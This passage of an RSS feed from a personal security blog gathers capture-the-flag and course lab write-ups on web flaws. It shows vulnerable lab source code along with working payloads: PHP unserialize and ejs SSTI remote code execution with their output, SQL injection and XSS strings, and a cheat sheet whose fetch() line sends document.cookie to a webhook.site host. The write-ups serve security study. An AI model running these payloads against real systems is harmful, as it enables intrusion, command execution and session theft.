from flask import Flask, render_template_string, request, send_file app = Flask(__name__) @app.get("/") def home(): return render_template_string(""" &lt;form method="POST"> &lt;input type="text" name="name" placeholder="Your name"> &lt;button>submit&lt;/button> &lt;/form> &lt;p>&lt;a href="https://bernie6401.github.io/source">Source code&lt;/a>&lt;/p> """) @app.post("/") def welcome_message(): name = request.form.get('name') return render_template_string("&lt;p>Hello, " + name + "&lt;/p>") @app.get("/source") def source(): return send_file(__file__, mimetype="text/plain") if __name__ == '__main__': app.run(threaded=True, debug=True) :::</description></item><item><title>Simple Web 0x16.5(php unserialize)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/index.html</guid><description>Simple Web 0x16.5(php unserialize) tags: NTUSTWS CTF Web Background php magic method Source code class cat { public $sound = 'ls'; function __wakeup() { system("echo".$this->sound); } } $cat = unserialize($_GET['cat']); Description &amp; Analyze $ php -a php > class cat php > public { php { public $sound = 'ls'; php { function __wakeup() php { { php { system("echo ".$this->sound); php { } php { } php > $_GET['cat']='O:3:"cat":1:{s:5:"sound";s:4:"meow";}'; php > $cat = unserialize($_GET['cat']); meow php > $_GET['cat']='O:3:"cat":1:{s:5:"sound";s:4:";id;";}'; php > $cat = unserialize($_GET['cat']); uid=1000(sbk6401) gid=1000(sbk6401) groups=1000(sbk6401),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker) This is a typical command injection. The magic method __wakeup() will be called when unserialized something.</description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x11lab---pickle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x11lab---pickle/index.html</guid><description>Simple Web 0x16(Lab - Pickle) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8600/ Note: open a brand new window that haven’t login http://h4ck3r.quest
Background 0x15.5(Pickle)
Source code :::spoiler code
from flask import Flask, request, make_response, redirect, send_file import base64 import pickle app = Flask(__name__) @app.route("/sauce") def sauce(): return send_file(__file__, mimetype="text/plain") @app.route("/") def main(): session = request.cookies.get("session") if session == None: return '&lt;form action="https://bernie6401.github.io/login" method="POST">' +\ '&lt;p>Name: &lt;input name="name" type="text">&lt;/p>' +\ '&lt;p>Age: &lt;input name="age" type="number">&lt;/p>' +\ '&lt;button>Submit&lt;/button>&lt;/form>&lt;hr>&lt;a href="https://bernie6401.github.io/sauce">Source code&lt;/a>' else: user = pickle.loads(base64.b64decode(session)) return f'&lt;p>Name: {user["name"]}&lt;/p>&lt;p>Age: {user["age"]}&lt;/p>' @app.route("/login", methods=['POST']) def login(): user = base64.b64encode(pickle.dumps({ "name": request.form.get('name'), "age": int(request.form.get('age')) })) resp = make_response(redirect('/')) resp.set_cookie("session", user) return resp :::</description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/index.html</guid><description>Simple Web 0x16(Lab - Pickle) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8600/ Note: open a brand new window that haven’t login http://h4ck3r.quest
Background 0x15.5(Pickle)
Source code :::spoiler code
from flask import Flask, request, make_response, redirect, send_file import base64 import pickle app = Flask(__name__) @app.route("/sauce") def sauce(): return send_file(__file__, mimetype="text/plain") @app.route("/") def main(): session = request.cookies.get("session") if session == None: return '&lt;form action="https://bernie6401.github.io/login" method="POST">' +\ '&lt;p>Name: &lt;input name="name" type="text">&lt;/p>' +\ '&lt;p>Age: &lt;input name="age" type="number">&lt;/p>' +\ '&lt;button>Submit&lt;/button>&lt;/form>&lt;hr>&lt;a href="https://bernie6401.github.io/sauce">Source code&lt;/a>' else: user = pickle.loads(base64.b64decode(session)) return f'&lt;p>Name: {user["name"]}&lt;/p>&lt;p>Age: {user["age"]}&lt;/p>' @app.route("/login", methods=['POST']) def login(): user = base64.b64encode(pickle.dumps({ "name": request.form.get('name'), "age": int(request.form.get('age')) })) resp = make_response(redirect('/')) resp.set_cookie("session", user) return resp :::</description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/index.html</guid><description>Simple Web 0x17(Lab - Baby Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8601/
Background 0x16.5(php unserialize)
Source code :::spoiler code
&lt;?php isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Cat { public $name = '(guest cat)'; function __construct($name) { $this->name = $name; } function __wakeup() { echo "&lt;pre>"; system("cowsay 'Welcome back, $this->name'"); echo "&lt;/pre>"; } } if (!isset($_COOKIE['cat_session'])) { $cat = new Cat("cat_" . rand(0, 0xffff)); setcookie('cat_session', base64_encode(serialize($cat))); } else { $cat = unserialize(base64_decode($_COOKIE['cat_session'])); } ?> &lt;p>Hello, &lt;?= $cat->name ?>.&lt;/p> &lt;a href="https://bernie6401.github.io/?source">source code&lt;/a> :::</description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/index.html</guid><description>Simple Web 0x17(Lab - Baby Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8601/
Background 0x16.5(php unserialize)
Source code :::spoiler code
&lt;?php isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Cat { public $name = '(guest cat)'; function __construct($name) { $this->name = $name; } function __wakeup() { echo "&lt;pre>"; system("cowsay 'Welcome back, $this->name'"); echo "&lt;/pre>"; } } if (!isset($_COOKIE['cat_session'])) { $cat = new Cat("cat_" . rand(0, 0xffff)); setcookie('cat_session', base64_encode(serialize($cat))); } else { $cat = unserialize(base64_decode($_COOKIE['cat_session'])); } ?> &lt;p>Hello, &lt;?= $cat->name ?>.&lt;/p> &lt;a href="https://bernie6401.github.io/?source">source code&lt;/a> :::</description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/index.html</guid><description>Simple Web 0x18(Lab - Magic Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8602/
Background None…
Source code :::spoiler code
isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Magic { function cast($spell) { echo "&lt;script>alert('MAGIC, $spell!');&lt;/script>"; } } // Useless class? class Caster { public $cast_func = 'intval'; function cast($val) { return ($this->cast_func)($val); } } class Cat { public $magic; public $spell; function __construct($spell) { $this->magic = new Magic(); $this->spell = $spell; } function __wakeup() { echo "Cat Wakeup!\n"; $this->magic->cast($this->spell); } } if (isset($_GET['spell'])) { $cat = new Cat($_GET['spell']); } else if (isset($_COOKIE['cat'])) { echo "Unserialize...\n"; $cat = unserialize(base64_decode($_COOKIE['cat'])); } else { $cat = new Cat("meow-meow-magic"); } ?> &lt;pre> This is your 🐱: &lt;?php var_dump($cat) ?> &lt;/pre> &lt;p>Usage:&lt;/p> &lt;p>/?source&lt;/p> &lt;p>/?spell=the-spell-of-your-cat&lt;/p> :::</description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/index.html</guid><description>Simple Web 0x18(Lab - Magic Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8602/
Background None…
Source code :::spoiler code
isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Magic { function cast($spell) { echo "&lt;script>alert('MAGIC, $spell!');&lt;/script>"; } } // Useless class? class Caster { public $cast_func = 'intval'; function cast($val) { return ($this->cast_func)($val); } } class Cat { public $magic; public $spell; function __construct($spell) { $this->magic = new Magic(); $this->spell = $spell; } function __wakeup() { echo "Cat Wakeup!\n"; $this->magic->cast($this->spell); } } if (isset($_GET['spell'])) { $cat = new Cat($_GET['spell']); } else if (isset($_COOKIE['cat'])) { echo "Unserialize...\n"; $cat = unserialize(base64_decode($_COOKIE['cat'])); } else { $cat = new Cat("meow-meow-magic"); } ?> &lt;pre> This is your 🐱: &lt;?php var_dump($cat) ?> &lt;/pre> &lt;p>Usage:&lt;/p> &lt;p>/?source&lt;/p> &lt;p>/?spell=the-spell-of-your-cat&lt;/p> :::</description></item><item><title>Simple Web 0x19(Lab - PHP Login)</title><link>https://bernie6401.github.io/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/index.html</guid><description>Simple Web 0x19(Lab - PHP Login) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8081
Background Source code &lt;?php // BSides Ahmedabad CTF 2021: entrance include 'flag.php'; $users = array( "admin" => "ed2b7b57b3b5be3e8d4246c69e4b513608ffb352", "guest" => "35675e68f4b5af7b995d9205ad0fc43842f16450" ); function lookup($username) { global $users; return array_key_exists($username, $users) ? $users[$username] : ""; } if (!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) { $sha1pass = lookup($_POST['username']); if ($sha1pass == sha1($_POST['password'])) { if ($_POST['username'] !== 'guest') echo $FLAG; else echo 'Welcome guest!'; } else { echo 'Login Failed!'; } } else { echo "You can login with guest:guest"; } echo "&lt;br>\n"; highlight_file(__file__); ?> Exploit Must change GET method to POST method and add Content-Type: application/x-www-form-urlencoded in header</description></item><item><title>Simple Web 0x22(Lab - Pug)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/index.html</guid><description>Simple Web 0x22(Lab - Pug) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8008
Source code :::spoiler
const express = require('express'); const pug = require('pug'); const app = express(); const template = ` h1 Hello %NAME% form(method='GET' action='https://bernie6401.github.io/') div label(for='nickname') Name: input#nickname(type='text', placeholder='Nickname' name='name') button(type='submit') Submit a(href='https://bernie6401.github.io/source') Source Code `; app.get('/', (req, res) => { const name = (req.query.name ?? 'Anonymous').toString(); if (name.includes('{')) return res.send('Nice try'); let html = pug.render(template.replace('%NAME%', name)); res.set('Content-Type', 'text/html'); res.send(html); }); app.get("/source", (_, res) => { res.sendFile(__filename); }); app.listen(3000, () => console.log(':3000')); :::</description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x14lab---xxe/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x14lab---xxe/index.html</guid><description>Simple Web 0x23(Lab - XXE) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8604/
Background XML Tree XML Parser AJAX - Server Response XML DTD
输入流 php://input
php://input可以读取没有处理过的POST数据。
Day 18：Stream 概述
php://input 取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。
來自外部的威脅-XXE漏洞攻擊成因 :::spoiler XXE course lecture ::: :::spoiler exploit type</description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/index.html</guid><description>Simple Web 0x23(Lab - XXE) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8604/
Background XML Tree XML Parser AJAX - Server Response XML DTD
输入流 php://input
php://input可以读取没有处理过的POST数据。
Day 18：Stream 概述
php://input 取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。
來自外部的威脅-XXE漏洞攻擊成因 :::spoiler XXE course lecture ::: :::spoiler exploit type</description></item><item><title>Simple Web 0x24(Lab - how2http)</title><link>https://bernie6401.github.io/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/index.html</guid><description>Simple Web 0x24(Lab - how2http) Source code &lt;?php show_source(__FILE__); include("flag.php"); if (!empty($_SERVER["HTTP_CLIENT_IP"])){ $ip = $_SERVER["HTTP_CLIENT_IP"]; } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){ $ip = $_SERVER["HTTP_X_FORWARDED_FOR"]; } else { $ip = $_SERVER["REMOTE_ADDR"]; } if ($_COOKIE['user'] !== 'admin') die("Not admim"); if( $_SERVER["REQUEST_METHOD"] !== "FLAG" ) die("u don't need flag?"); if ($ip === "127.0.0.1") echo $FLAG; else echo "NOPE!"; ?> Recon 主要是參考之前寫過的PicoCTF - Who are you?和PicoCTF - Who are you?，按照source code我們需要更改一些header讓他可以被forge然後bypass這些條件，首先是IP，他其實給的很寬鬆，還有X-Forwarded-For的header可以用，就直接==X-Forwarded-For: 127.0.0.1==；另外，cookie的user要等於admin→==Cookie: user=admin==；再來，request method要等於FLAG→==FLAG / HTTP/1.1==
Exploit</description></item><item><title>Simple Web 0x41(2023 HW - Double Injection - FLAG1)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/index.html</guid><description>Simple Web 0x41(2023 HW - Double Injection - FLAG1) Background Time Based SQLi :::info 建議先在local side自架docker environment，debug比較方便；另外也推薦在local自架sqlite的環境，下語法或是debug也很方便 :::
Source code :::spoiler init-db.js
const fs = require('fs'); const sqlite3 = require('sqlite3').verbose(); const FLAG1 = fs.readFileSync('/flag1.txt', 'utf8').trim(); const db = new sqlite3.Database('/etc/db.sqlite3'); db.exec(` DROP TABLE IF EXISTS users; CREATE TABLE db ( users JSON NOT NULL ); INSERT INTO db(users) VALUES ('{ "admin": { "username": "admin", "password": "${FLAG1}" }, "guest": { "username": "guest", "password": "guest" } }'); `); ::: :::spoiler Dockerfile</description></item><item><title>Simple Web 0x42(2023 HW - Double Injection - FLAG2)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/index.html</guid><description>Simple Web 0x42(2023 HW - Double Injection - FLAG2) Background Node JS ejs SSTI
Source code 呈上題
Recon 這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like: 基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:
admin.password") as password, json_extract(users, '$.admin.password') as password from db; -- # 後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看之前寫的文章
Exploit - Ejs SSTI RCE Payload 1: Username: admin.password") as password, json_extract(users, '$.admin.password') as password from db; -- # &lt;%= global.process.mainModule.require("child_process").execSync("ls -al /").toString() %> Password: FLAG{sqlite_js0n_inject!on} Result: total	76	drwxr-xr-x	1	root	root	4096	Dec	18	18:54	.	drwxr-xr-x	1	root	root	4096	Dec	18	18:54	..	-rwxr-xr-x	1	root	root	0	Dec	18	18:54	.dockerenv	drwxr-xr-x	1	root	root	4096	Dec	11	18:36	bin	drwxr-xr-x	5	root	root	340	Dec	18	18:54	dev	drwxr-xr-x	1	root	root	4096	Dec	18	18:54	etc	-rw-r--r--	1	root	root	28	Dec	18	17:15	flag1.txt	-rw-r--r--	1	root	root	23	Dec	18	17:15	flag2-1PRmDsTXoo3uPCdq.txt	drwxr-xr-x	1	root	root	4096	Dec	18	17:15	home	drwxr-xr-x	1	root	root	4096	Dec	11	18:36	lib	drwxr-xr-x	5	root	root	4096	Dec	7	09:43	media	drwxr-xr-x	2	root	root	4096	Dec	7	09:43	mnt	drwxr-xr-x	1	root	root	4096	Dec	11	18:36	opt	dr-xr-xr-x	497	root	root	0	Dec	18	18:54	proc	drwx------	1	root	root	4096	Dec	11	18:36	root	drwxr-xr-x	2	root	root	4096	Dec	7	09:43	run	drwxr-xr-x	2	root	root	4096	Dec	7	09:43	sbin	drwxr-xr-x	2	root	root	4096	Dec	7	09:43	srv	dr-xr-xr-x	13	root	root	0	Dec	18	18:54	sys	drwxrwxrwt	1	root	root	4096	Dec	22	17:16	tmp	drwxr-xr-x	1	root	root	4096	Dec	18	13:27	usr	drwxr-xr-x	12	root	root	4096	Dec	7	09:43	var	Payload 2: Username: admin.password") as password, json_extract(users, '$.admin.password') as password from db; -- # &lt;%= global.process.mainModule.require("child_process").execSync("cat /flag2-1PRmDsTXoo3uPCdq.txt").toString() %> Password: FLAG{sqlite_js0n_inject!on} Result: FLAG{ezzzzz_sqli2ssti} Flag: FLAG{ezzzzz_sqli2ssti}</description></item><item><title>Simple Welcome - 0x04(Lab - Script)</title><link>https://bernie6401.github.io/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/index.html</guid><description>Simple Welcome - 0x04(Lab - Script) tags: CTF Web eductf Challenge: https://pyscript.ctf.zoolab.org/
Source Code &lt;?php if(!isset($_FILES["file"])) highlight_file(__file__) &amp;&amp; die(); $flag = file_get_contents('/flag'); $node = @`node {$_FILES["file"]["tmp_name"]} 2>&amp;1`; $python = @`python3 {$_FILES["file"]["tmp_name"]} 2>&amp;1`; if($flag === $node &amp;&amp; $flag === $python) echo 'Here is your Flag: '.$flag; else echo 'Fail :('; ?> Analysis Must write a script that can be executed in python and node language simultaneously.
Exploit - Using comment In python The comment is # for single line and ''' for multi lines In node The comment is // for single line and /**/ for multi lines Using different definition of comment to write script Some tips: a = 1 // 1; b = '''''' Both of these instruction are valid in python Whole payload Python</description></item><item><title>SQLi - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/index.html</guid><description>SQLi - APPRENTICE tags: Portswigger Web Security Academy Web [TOC]
Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data Hint: This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: SELECT * FROM products WHERE category = 'Gifts' AND released = 1 Exp Payload: https://0a2700a903496ccd807a2626001400e3.web-security-academy.net/filter?category=%27%20or%20%271%27=%271%27%20--%20# :::spoiler Success Screenshot :::</description></item><item><title>Web Cheat Sheet</title><link>https://bernie6401.github.io/tools/ctf/web-cheat-sheet/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/web-cheat-sheet/index.html</guid><description>Web Cheat Sheet Online Tools Fuck Beautifier jsfuck JSNice jjencode JS 反混淆器: 可以反混淆或解密JS的檔案 aaencode JS 壓縮+加密+混淆+美化 Esolang List JS Fuck Decode aadecode Cheat-Sheet XSS-CheatSheet 利用XSS把session打到webhook上: window.location=&lt;requestbin.com>/?a+document.cookie // or fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GET', headers: { 'Cookie': document.cookie } }) All-Injection SSTI Payload: 記得找==os._wrap_close== {{().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id')}} {{self.__init__.__globals__.__builtins__.__import__("os").popen("cat%20Flag.txt").read()}} {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", "./flag.txt")}} {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']("cat /flag.txt")}} {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", file.lower())}} {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())}} Others wasm $\to$ c: wabt # 按照說明build完後進到./build $ ./wasm2c {wasm file path} -o {output c file path} Webhook Webhook.site Beeceptor Ngrok</description></item><item><title>XSS - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/xss---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/xss---apprentice/index.html</guid><description>XSS - APPRENTICE tags: Portswigger Web Security Academy Web [TOC]
Lab: Reflected XSS into HTML context with nothing encoded:zero: Description: This lab contains a simple reflected cross-site scripting vulnerability in the search functionality. Goal: To solve the lab, perform a cross-site scripting attack that calls the alert function. Exp Payload: &lt;script>alert(123)&lt;/script> :::spoiler Success Screenshot :::
Lab: Stored XSS into HTML context with nothing encoded Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality. Goal: To solve this lab, submit a comment that calls the alert function when the blog post is viewed. Exp You need to click into one post and comment something that contained script tag. Payload: &lt;script>alert(123)&lt;/script> :::spoiler Success Screenshot :::</description></item><item><title>XXE - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/index.html</guid><description>XXE - APPRENTICE tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input and returns any unexpected values in the response. Goal: To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. Lab: Exploiting XXE using external entities to retrieve files Recon Use Burp Suite to intercept package You can notice that it use a normal xml format. Exp - Inject Directly Exploit Payload:</description></item></channel></rss>